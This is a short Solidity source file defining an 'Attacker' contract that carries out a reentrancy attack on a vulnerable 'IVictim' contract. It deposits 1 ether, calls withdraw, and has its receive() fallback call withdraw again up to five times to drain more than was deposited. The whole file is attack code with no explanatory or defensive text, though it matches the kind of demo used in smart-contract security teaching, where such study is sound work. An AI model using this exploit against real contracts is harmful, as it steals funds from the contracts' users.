// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IVictim{
    function withdraw() external payable;
    function deposit() external payable;
}

contract Attacker {
    IVictim public victim;
    uint8 counter;
    
    constructor(IVictim _victim) payable {
        victim = _victim;
    }

    function deposit() external payable{
        victim.deposit{value: 1 ether}();
    }

    function attack() external {
        victim.withdraw();
    }

    receive() payable external {
        if(counter < 5) {
            ++counter;
            victim.withdraw();
        }
    }

    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }
}